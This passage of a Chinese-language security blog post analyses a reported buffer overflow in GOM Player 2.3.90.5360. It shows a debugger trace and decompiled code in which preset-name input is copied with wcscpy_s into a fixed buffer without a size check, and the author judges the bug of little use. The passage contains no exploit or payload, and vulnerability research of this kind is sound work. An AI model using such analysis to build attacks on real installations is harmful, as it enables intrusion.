{</span><br><span class="line">      <span class="built_in">sub_606910</span>(<span class="keyword">this</span>);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在sub_606910中，首先进行初始化，load_window显示对话框并进行添加修改选择，将选择的操作作为返回值返回(v3)。操作状态为100是添加预设，101是修改预设</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; p</span><br><span class="line">eax=00000018 ebx=0c003a38 ecx=76fb1cfc edx=00000000 esi=00000064 edi=0c003a38</span><br><span class="line">eip=00ab6a01 esp=0086eac8 ebp=0086ee08 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246</span><br><span class="line">GOM32Q_vc120_ReleaseQC+0x206a01:</span><br><span class="line">00ab6a01 83fe64          cmp     esi,64h</span><br></pre></td></tr></tbody></table></figure>
+
+<p>进入添加预设功能时，会将输入的数据转到Source中，并利用wcscpy_s将数据复制到Destination中，并没有对输入数据的大小进行检测限制</p>
+<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __thiscall <span class="title">sub_606910</span><span class="params">(<span class="type">void</span> *<span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *v6; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  _DWORD *v10; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">wchar_t</span> *v12; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">wchar_t</span> *Source; <span class="comment">// [esp+10h] [ebp-324h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v15[<span class="number">43</span>]; <span class="comment">// [esp+14h] [ebp-320h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [esp+C0h] [ebp-274h]</span></span><br><span class="line">  <span class="type">wchar_t</span> Destination[<span class="number">260</span>]; <span class="comment">// [esp+F4h] [ebp-240h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v18[<span class="number">40</span>]; <span class="comment">// [esp+2FCh] [ebp-38h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [esp+330h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (dword_CF83C4 &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">  {</span><br><span class="line">    dword_CF83C4 |= <span class="number">1u</span>;</span><br><span class="line">    dword_CF83C8 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">atexit</span>(nullsub_8);</span><br><span class="line">    v19 = <span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line">  (*(*dword_CF83C8 + <span class="number">56</span>))(dword_CF83C8);</span><br><span class="line">  <span class="built_in">sub_646A00</span>(v15, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, v2);</span><br><span class="line">  v19 = <span class="number">1</span>;</span><br><span class="line">  v3 = <span class="built_in">load_window</span>(v15);</span><br><span class="line">  <span class="keyword">if</span> ( (dword_CF83C4 &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">  {</span><br><span class="line">    dword_CF83C4 |= <span class="number">1u</span>;</span><br><span class="line">    <span class="built_in">LOBYTE</span>(v19) = <span class="number">2</span>;</span><br><span class="line">    dword_CF83C8 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">atexit</span>(nullsub_8);</span><br><span class="line">    <span class="built_in">LOBYTE</span>(v19) = <span class="number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  (*(*dword_CF83C8 + <span class="number">64</span>))(dword_CF83C8);</span><br><span class="line">  <span class="keyword">if</span> ( v3 == <span class="string">'d'</span> )</span><br><span class="line">  {</span><br><span class="line">    v4 = v16;</span><br><span class="line">    <span class="keyword">if</span> ( v16 || (<span class="built_in">sub_646D00</span>(v15), (v4 = v16) != <span class="number">0</span>) )</span><br><span class="line">    {</span><br><span class="line">      v5 = v4 - <span class="number">116</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v5 )</span><br><span class="line">      {</span><br><span class="line">        <span class="built_in">sub_44A540</span>(&amp;Source, *(v5 + <span class="number">144</span>));</span><br><span class="line">        <span class="built_in">LOBYTE</span>(v19) = <span class="number">3</span>;</span><br><span class="line">        <span class="built_in">wcscpy_s</span>(Destination, <span class="number">0x104</span>u, Source);</span><br><span class="line">        <span class="built_in">sub_5CE090</span>(v18);</span><br><span class="line">        v6 = *(<span class="built_in">sub_7B4DC0</span>(&amp;dword_CF1C10, Destination) + <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> ( *(<span class="built_in">sub_90A3AA</span>(<span class="keyword">this</span>, <span class="number">1301</span>) + <span class="number">180</span>) == <span class="number">1</span> )</span><br><span class="line">          v7 = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          v7 = <span class="built_in">sub_5C71F0</span>(v6, v6);</span><br><span class="line">LABEL_22:</span><br><span class="line">        <span class="built_in">sub_5C74F0</span>(v7);</span><br><span class="line">LABEL_23:</span><br><span class="line">        <span class="built_in">LOBYTE</span>(v19) = <span class="number">1</span>;</span><br><span class="line">        v12 = Source - <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">if</span> ( _InterlockedDecrement(Source - <span class="number">1</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">          (*(**v12 + <span class="number">4</span>))(v12);</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">101</span> )</span><br><span class="line">  {</span><br><span class="line">    v8 = v16;</span><br><span class="line">    <span class="keyword">if</span> ( v16 || (<span class="built_in">sub_646D00</span>(v15), (v8 = v16) != <span class="number">0</span>) )</span><br><span class="line">    {</span><br><span class="line">      v9 = v8 - <span class="number">116</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v9 )</span><br><span class="line">      {</span><br><span class="line">        <span class="built_in">sub_44A540</span>(&amp;Source, *(v9 + <span class="number">144</span>));</span><br><span class="line">        <span class="built_in">LOBYTE</span>(v19) = <span class="number">5</span>;</span><br><span class="line">        v10 = dword_CF1C14;</span><br><span class="line">        <span class="keyword">if</span> ( !dword_CF1C14 )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        {</span><br><span class="line">          v11 = v10[<span class="number">2</span>];</span><br><span class="line">          v10 = *v10;</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">sub_44E730</span>(&amp;Source, v11) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">if</span> ( !v10 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> ( !v11 )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">        <span class="built_in">sub_5CE090</span>(v11 + <span class="number">520</span>);</span><br><span class="line">        <span class="built_in">sub_90A3AA</span>(<span class="keyword">this</span>, <span class="number">1301</span>);</span><br><span class="line">        v7 = <span class="built_in">sub_5C7650</span>(v11);</span><br><span class="line">        <span class="keyword">if</span> ( v7 &lt; <span class="number">0</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  v19 = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_646C50</span>();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这里省去了一些GUI代码逻辑，经过分析之后发现这个洞（bug）非常鸡肋，是由wcscpy_s的函数实现所产生的</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/z1r00">Projects</a></li>
+         
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://www.z1r0.top/2024/07/06/GOM-Player-2-3-90-5360-Buffer-Overflow/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://www.z1r0.top/2024/07/06/GOM-Player-2-3-90-5360-Buffer-Overflow/&amp;text=GOM Player 2.3.90.5360 - Buffer Overflow"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://www.z1r0.top/2024/07/06/GOM-Player-2-3-90-5360-Buffer-Overflow/&amp;title=GOM Player 2.3.90.5360 - Buffer Overflow"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.z1r0.top/2024/07/06/GOM-Player-2-3-90-5360-Buffer-Overflow/&amp;is_video=false&amp;description=GOM Player 2.3.90.5360 - Buffer Overflow"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=GOM Player 2.3.90.5360 - Buffer Overflow&amp;body=Check out this article: https://www.z1r0.top/2024/07/06/GOM-Player-2-3-90-5360-Buffer-Overflow/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://www.z1r0.top/2024/07/06/GOM-Player-2-3-90-5360-Buffer-Overflow/&amp;title=GOM Player 2.3.90.5360 - Buffer Overflow"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://www.z1r0.top/2024/07/06/GOM-Player-2-3-90-5360-Buffer-Overflow/&amp;title=GOM Player 2.3.90.5360 - Buffer Overflow"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://www.z1r0.top/2024/07/06/GOM-Player-2-3-90-5360-Buffer-Overflow/&amp;title=GOM Player 2.3.90.5360 - Buffer Overflow"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://www.z1r0.top/2024/07/06/GOM-Player-2-3-90-5360-Buffer-Overflow/&amp;title=GOM Player 2.3.90.5360 - Buffer Overflow"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://www.z1r0.top/2024/07/06/GOM-Player-2-3-90-5360-Buffer-Overflow/&amp;name=GOM Player 2.3.90.5360 - Buffer Overflow&amp;description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://www.z1r0.top/2024/07/06/GOM-Player-2-3-90-5360-Buffer-Overflow/&amp;t=GOM Player 2.3.90.5360 - Buffer Overflow"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright ©
+    
+    
+    2021-2024
+    z1r0
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'">
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+
+<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>
